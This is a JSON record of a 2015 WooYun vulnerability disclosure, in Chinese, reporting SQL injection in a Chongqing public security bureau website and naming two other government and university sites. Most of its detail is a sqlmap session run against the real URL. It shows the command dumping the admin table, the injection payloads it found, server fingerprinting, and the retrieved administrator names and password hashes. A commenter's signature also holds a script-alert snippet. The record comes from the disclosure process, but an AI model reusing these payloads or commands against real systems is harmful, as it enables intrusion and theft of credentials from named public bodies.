{"id": 30238, "wybug_id": "wooyun-2015-0117079", "wybug_title": "重庆某敏感部门系统存在SQL注入漏洞(可影响服务器控制权限)", "wybug_corp": "公安部一所", "wybug_author": "小龙", "wybug_date": "2015-06-03 18:10", "wybug_open_date": "2015-07-19 08:36", "wybug_type": "内部绝密信息泄漏", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(公安部一所)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["渗透测试思路", "安全意识不足", "内部敏感信息泄漏", "运维管理不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向公众公开  简要描述： 第一次玩注入，大家别喷 详细说明：  \n\n\n\n   漏洞证明：  \n涉及站点\n重庆市公安局渝中区分局公众信息网 cqyzga.gov.cn重庆大学国家大学科技园 www.cqusp.com重庆江北区环境保护局 www.cqjbhb.gov.cn\nhttp://www.cqyzga.gov.cn/Article/DisplayNews.asp?ArticleID=504F:\\Python27\\sqlmap>sqlmap.py -u \"http://www.cqyzga.gov.cn/Article/DisplayNews.asp?ArticleID=504\" --dump -T PE_Admin -C \"AdminName,Password\" ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150529}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 22:42:17[22:42:17] [INFO] resuming back-end DBMS 'microsoft sql server'[22:42:17] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: ArticleID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ArticleID=504 AND 1057=1057    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: ArticleID=504 AND 6539=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6539=6539) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(118)+CHAR(113)))    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: ArticleID=(SELECT CHAR(113)+CHAR(118)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9418=9418) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(118)+CHAR(113))    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: ArticleID=504 WAITFOR DELAY '0:0:5'---[22:42:19] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[22:42:19] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries[22:42:19] [INFO] fetching current database[22:42:19] [INFO] resumed: webserveryzfj[22:42:19] [INFO] fetching columns 'AdminName, Password' for table 'PE_Admin' in database 'webserveryzfj'[22:42:19] [INFO] heuristics detected web page charset 'GB2312'[22:42:19] [INFO] the SQL query used returns 2 entries[22:42:19] [INFO] retrieved: AdminName[22:42:19] [INFO] retrieved: nvarchar[22:42:19] [INFO] retrieved: Password[22:42:20] [INFO] retrieved: nvarchar[22:42:20] [INFO] fetching entries of column(s) 'AdminName, Password' for table'PE_Admin' in database 'webserveryzfj'[22:42:20] [INFO] retrieved: 2[22:42:20] [INFO] fetching number of distinct values for column 'Password'[22:42:20] [INFO] retrieved: 2[22:42:20] [INFO] using column 'Password' as a pivot for retrieving row data[22:42:20] [INFO] retrieved: 16aebbaa0ac28d51[22:42:21] [INFO] retrieved: admin[22:42:21] [INFO] retrieved: ed5683a45f67a668[22:42:21] [INFO] retrieved: 管理员[22:42:21] [INFO] analyzing table dump for possible password hashes[22:42:21] [INFO] recognized possible password hashes in column 'Password'do you want to store hashes to a temporary file for eventual further processingwith other tools [y/N]\n   修复方案：     版权声明：转载请注明来源 小龙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-06-04 08:34 厂商回复： 非常感谢！你提交的漏洞已验证，会尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-03 19:06 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  搞重庆    \n     2015-06-03 22:18 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  支持一下    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}